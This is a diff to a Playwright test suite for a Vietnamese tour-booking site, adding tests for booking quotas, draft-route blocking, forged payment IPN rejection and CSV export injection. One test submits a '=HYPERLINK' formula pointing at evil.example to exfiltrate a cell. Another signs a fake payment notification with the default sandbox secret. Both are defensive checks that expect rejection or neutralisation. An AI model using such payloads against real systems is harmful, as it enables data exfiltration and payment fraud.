@@ -1,8 +1,9 @@
 // UC-07 Đặt lịch có giữ chỗ và UC-08 Thanh toán thử nghiệm (sandbox) + hoàn tiền.
 import fs from 'node:fs';
 import path from 'node:path';
-import { test, expect } from '@playwright/test';
-import { AUTH_DIR, authFile, actual, shot, getPage, send, showText } from './helpers.js';
+import { test, expect, request as pwRequest } from '@playwright/test';
+import crypto from 'node:crypto';
+import { AUTH_DIR, authFile, actual, shot, getPage, send, showText, registerFresh } from './helpers.js';
 
 const ROUTE = 'dau-an-thang-long';
 const TOUR = `/vi/tuyen-tham-quan/${ROUTE}`;
@@ -84,16 +85,25 @@ test.describe.serial('BOOK + PAY', () => {
         await shot(page, 'TC-BOOK-004');
     });
 
-    test('TC-BOOK-005 số khách 10 (đúng biên trên) được chấp nhận', async ({ page }, ti) => {
+    test('TC-BOOK-005 số khách 10 (đúng biên trên) được chấp nhận', async ({ browser }, ti) => {
+        // Vòng 3: user@ đã giữ 2 + 1 chỗ trong ngày (seed + TC-BOOK-001) nên 10 chỗ sẽ vượt hạn mức 10 chỗ/ngày (M6)
+        // → dùng tài khoản mới đăng ký; tài khoản này dùng tiếp cho TC-BOOK-011.
+        test.setTimeout(150_000);
+        state.freshA = await registerFresh(browser, 'bookA');
+        const ctx = await browser.newContext({ storageState: state.freshA.file });
+        const page = await ctx.newPage();
         await fillBooking(page, 5, { qty: 10 });
         await page.waitForURL(/\/vi\/dat-lich\/BK-/);
         const code = page.url().split('/').pop();
         const b = await bookingProps(page.request, code);
-        actual(ti, `Tạo ${code}, quantity=${b.quantity}, status=${b.status}.`);
         await shot(page, 'TC-BOOK-005');
-        // Dọn: hủy để trả chỗ
-        await send(page.request, 'POST', `/vi/dat-lich/${code}/huy`, {}, { accept: 'html' });
+        // Dọn: hủy để trả chỗ (booking cancelled không tính vào hạn mức ngày)
+        const c = await send(page.request, 'POST', `/vi/dat-lich/${code}/huy`, {}, { accept: 'html' });
+        const after = await bookingProps(page.request, code);
+        await ctx.close();
+        actual(ti, `Tài khoản mới ${state.freshA.email}: tạo ${code}, quantity=${b.quantity}, status=${b.status}; hủy → ${c.status}, status=${after.status}.`);
         expect(b.quantity).toBe(10);
+        expect(after.status).toBe('cancelled');
     });
 
     test('TC-BOOK-006 số điện thoại sai định dạng bị từ chối', async ({ page }, ti) => {
@@ -219,6 +229,145 @@ test.describe.serial('BOOK + PAY', () => {
         await shot(page, 'TC-BOOK-009');
         expect(b.status).toBe('cancelled');
         expect(after.available).toBe(mid.available + 3);
+    });
+});
+
+// ===== Vòng 3: hạn mức đặt chỗ (M6), tuyến nháp/xóa (M5), IPN khóa mặc định (H3), CSV injection (M3) =====
+const DEFAULT_SECRET = 'sandbox-secret-change-me';
+/** Ký payload giống SandboxGateway::sign (ksort + http_build_query RFC3986 + HMAC-SHA256). */
+function signLikeGateway(payload, secret) {
+    const enc = (v) => encodeURIComponent(String(v)).replace(/[!'()*]/g, (c) => '%' + c.charCodeAt(0).toString(16).toUpperCase());
+    const canon = Object.keys(payload).sort().map((k) => `${enc(k)}=${enc(payload[k])}`).join('&');
+    return crypto.createHmac('sha256', secret).update(canon).digest('hex');
+}
+const contact = (name) => ({ contact_name: name, contact_phone: '0912345678', contact_email: 'qa@disanso.test' });
+
+test.describe.serial('BOOK – hạn mức và tính toàn vẹn (vòng 3)', () => {
+    test.describe.configure({ timeout: 150_000 });
+
+    test('TC-BOOK-011 giữ chỗ thứ 4 khi đang có 3 đặt lịch chưa thanh toán bị chặn', async ({ browser }, ti) => {
+        if (!state.freshA) state.freshA = await registerFresh(browser, 'bookA');
+        const ctx = await browser.newContext({ storageState: state.freshA.file });
+        const page = await ctx.newPage();
+        await page.goto('/vi');
+        const formula = '=HYPERLINK("http://evil.example/?"&A2,"Mo")';
+        state.quotaCodes = [];
+        const codes = [];
+        for (let i = 0; i < 3; i++) {
+            const r = await send(page.request, 'POST', '/vi/dat-lich/9', { quantity: 1, ...contact(i === 0 ? formula : `QA hạn mức ${i + 1}`) });
+            codes.push(r.status);
+            if (r.location.includes('/dat-lich/BK-')) state.quotaCodes.push(r.location.split('/').pop());
+        }
+        await fillBooking(page, 9, { qty: 1 });
+        const e = page.locator('#booking .field-error').first();
+        await expect(e).toBeVisible();
+        const msg = await e.innerText();
+        await shot(page, 'TC-BOOK-011');
+        const json = await send(page.request, 'POST', '/vi/dat-lich/9', { quantity: 1, ...contact('QA lần 4') });
+        await ctx.close();
+        actual(ti, `${state.freshA.email}: 3 lần giữ 1 chỗ khung giờ #9 → ${codes.join(', ')} (${state.quotaCodes.join(', ')}); lần 4 qua giao diện: "${msg}"; lần 4 gửi JSON → ${json.status} ${JSON.stringify(json.body?.errors ?? json.body).slice(0, 160)}.`);
+        expect(state.quotaCodes.length).toBe(3);
+        expect(msg).toMatch(/3 đặt lịch chưa thanh toán/);
+        expect(json.status).toBe(422);
+    });
+
+    test('TC-SEC-016 IPN ký bằng khóa mặc định công khai bị từ chối 400, đặt lịch không thành paid', async ({ browser, baseURL, page }, ti) => {
+        const ctx = await browser.newContext({ storageState: state.freshA.file });
+        const own = await ctx.newPage();
+        await own.goto('/vi');
+        const code = state.quotaCodes[1];
+        const pay = await send(own.request, 'POST', `/vi/dat-lich/${code}/thanh-toan`, {}, { accept: 'html' });
+        const txn = pay.location.split('/').pop();
+        const before = await bookingProps(own.request, code);
+        const payload = { txn_ref: txn, amount: before.total_vnd, currency: 'VND', outcome: 'success', response_code: '00', pay_date: '20261018190000', nonce: 'qa-r3-forged-0001' };
+        const api = await pwRequest.newContext({ baseURL, storageState: { cookies: [], origins: [] } });
+        const forged = await api.post('/api/v1/payments/sandbox/ipn', { data: { ...payload, signature: signLikeGateway(payload, DEFAULT_SECRET) }, headers: { Accept: 'application/json' } });
+        const forgedBody = await forged.text();
+        const empty = await api.post('/api/v1/payments/sandbox/ipn', { data: { ...payload, signature: signLikeGateway(payload, '') }, headers: { Accept: 'application/json' } });
+        await api.dispose();
+        const after = await bookingProps(own.request, code);
+        const p = after.payments.find((x) => x.txn_ref === txn);
+        await ctx.close();
+        const text = `Booking ${code}, giao dịch ${txn} (${before.total_vnd} VND), trạng thái trước: ${before.status}\nIPN success ký bằng "${DEFAULT_SECRET}" → HTTP ${forged.status()} ${forgedBody}\nIPN ký bằng khóa rỗng → HTTP ${empty.status()}\nSau đó: booking=${after.status}, payment=${p?.status}`;
+        actual(ti, text.replace(/\n/g, '; '));
+        await showText(page, 'TC-SEC-016', 'IPN giả mạo bằng khóa HMAC mặc định', text);
+        expect(forged.status()).toBe(400);
+        expect(forgedBody).toContain('Invalid signature');
+        expect(empty.status()).toBe(400);
+        expect(after.status).not.toBe('paid');
+        expect(p?.status).toBe('initiated');
+    });
+
+    test('TC-SEC-019 xuất CSV đặt lịch vô hiệu hóa công thức trong tên liên hệ (CSV injection)', async ({ browser, page }, ti) => {
+        const mgr = await browser.newContext({ storageState: authFile('manager') });
+        const r = await mgr.request.get('/vi/quan-tri/thong-ke/xuat?type=bookings');
+        const csv = (await r.text()).replace(/^\uFEFF/, '');
+        const row = csv.split('\n').find((l) => l.includes(state.quotaCodes[0])) || '';
+        await mgr.close();
+        const text = `GET /vi/quan-tri/thong-ke/xuat?type=bookings → ${r.status()}\nTiêu đề: ${csv.split('\n')[0]}\nDòng của ${state.quotaCodes[0]} (contact_name gửi vào: =HYPERLINK(...)):\n${row}`;
+        actual(ti, text.replace(/\n/g, '; '));
+        await showText(page, 'TC-SEC-019', 'CSV injection – ô bắt đầu bằng =', text);
+        expect(row).toContain(`'=HYPERLINK`);
+        expect(row).not.toMatch(/(^|,)"?=HYPERLINK/);
+    });
+
+    test('TC-BOOK-012 hạn mức 10 chỗ/ngày: đã đặt 8 thì đặt thêm 3 bị chặn, thêm 2 được', async ({ browser }, ti) => {
+        const acc = await registerFresh(browser, 'bookB');
+        const ctx = await browser.newContext({ storageState: acc.file });
+        const page = await ctx.newPage();
+        await page.goto('/vi');
+        const a = await send(page.request, 'POST', '/vi/dat-lich/9', { quantity: 8, ...contact('QA 8 chỗ') });
+        await fillBooking(page, 9, { qty: 3 });
+        const e = page.locator('#booking .field-error').first();
+        await expect(e).toBeVisible();
+        const msg = await e.innerText();
+        await shot(page, 'TC-BOOK-012');
+        const c = await send(page.request, 'POST', '/vi/dat-lich/9', { quantity: 2, ...contact('QA 2 chỗ') });
+        const made = [a, c].filter((x) => x.location.includes('/dat-lich/BK-')).map((x) => x.location.split('/').pop());
+        for (const code of made) await send(page.request, 'POST', `/vi/dat-lich/${code}/huy`, {}, { accept: 'html' });
+        await ctx.close();
+        actual(ti, `${acc.email}: giữ 8 chỗ → ${a.status}; thêm 3 chỗ qua giao diện → "${msg}"; thêm 2 chỗ → ${c.status} ${c.location.split('/').pop()}; đã hủy ${made.join(', ')}.`);
+        expect(a.location).toContain('/dat-lich/BK-');
+        expect(msg).toMatch(/tối đa 10 chỗ.*còn 2 chỗ/);
+        expect(c.location).toContain('/dat-lich/BK-');
+    });
+
+    test('TC-BOOK-013 không giữ chỗ được trên khung giờ của tuyến nháp hoặc tuyến đã xóa', async ({ browser, page }, ti) => {
+        const ct = await browser.newContext({ storageState: authFile('contributor') });
+        await ct.request.get('/vi');
+        const slug = `qa-nhap-${Date.now().toString(36)}`;
+        const { page: form } = await getPage(ct.request, '/vi/quan-tri/tuyen-tham-quan/moi');
+        const created = await send(ct.request, 'POST', '/vi/quan-tri/tuyen-tham-quan', {
+            slug, duration_minutes: 120, difficulty: 'de', price_vnd: 100000, default_capacity: 10, status: 'draft',
+            translations: { vi: { name: `Tuyến nháp ${slug}`, description: 'Kiểm thử M5' } },
+            stops: [{ site_id: form.props.sites[0].id, stop_order: 1, dwell_minutes: 60 }],
+        }, { accept: 'html' });
+        await send(ct.request, 'POST', `/vi/quan-tri/tuyen-tham-quan/${slug}/khung-gio`, { starts_at: '2026-12-02 08:00', duration_minutes: 120, capacity: 10, guide_name: 'QA V5 M5', language: 'vi' }, { accept: 'html' });
+        const slotId = (await getPage(ct.request, `/vi/quan-tri/tuyen-tham-quan/${slug}/sua`)).page.props.route.slots[0].id;
+        const mem = await browser.newContext({ storageState: authFile('member') });
+        await mem.request.get('/vi');
+        const draft = await send(mem.request, 'POST', `/vi/dat-lich/${slotId}`, { quantity: 1, ...contact('QA tuyến nháp') });
+        const del = await send(ct.request, 'DELETE', `/vi/quan-tri/tuyen-tham-quan/${slug}`, {}, { accept: 'html' });
+        const deleted = await send(mem.request, 'POST', `/vi/dat-lich/${slotId}`, { quantity: 1, ...contact('QA tuyến đã xóa') });
+        await mem.close();
+        await ct.close();
+        const err = (x) => JSON.stringify(x.body?.errors ?? x.body?.message ?? x.location);
+        const text = `Contributor tạo tuyến nháp ${slug} → ${created.status}, khung giờ #${slotId}\nuser@ POST /vi/dat-lich/${slotId} (tuyến draft) → ${draft.status} ${err(draft)}\nContributor xóa tuyến (xóa mềm) → ${del.status}\nuser@ POST /vi/dat-lich/${slotId} (tuyến đã xóa) → ${deleted.status} ${err(deleted)}`;
+        actual(ti, text.replace(/\n/g, '; '));
+        await showText(page, 'TC-BOOK-013', 'Đặt chỗ trên tuyến nháp / đã xóa mềm', text);
+        expect(draft.status).toBe(422);
+        expect([404, 422]).toContain(deleted.status);
+        expect(draft.location).toBe('');
+        expect(deleted.location).toBe('');
+    });
+
+    test.afterAll(async ({ browser }) => {
+        // Dọn: hủy 3 booking của TC-BOOK-011 (một cái đang pending_payment sau TC-SEC-016)
+        if (!state.freshA || !state.quotaCodes) return;
+        const ctx = await browser.newContext({ storageState: state.freshA.file });
+        await ctx.request.get('/vi');
+        for (const code of state.quotaCodes) await send(ctx.request, 'POST', `/vi/dat-lich/${code}/huy`, {}, { accept: 'html' });
+        await ctx.close();
     });
 });
 
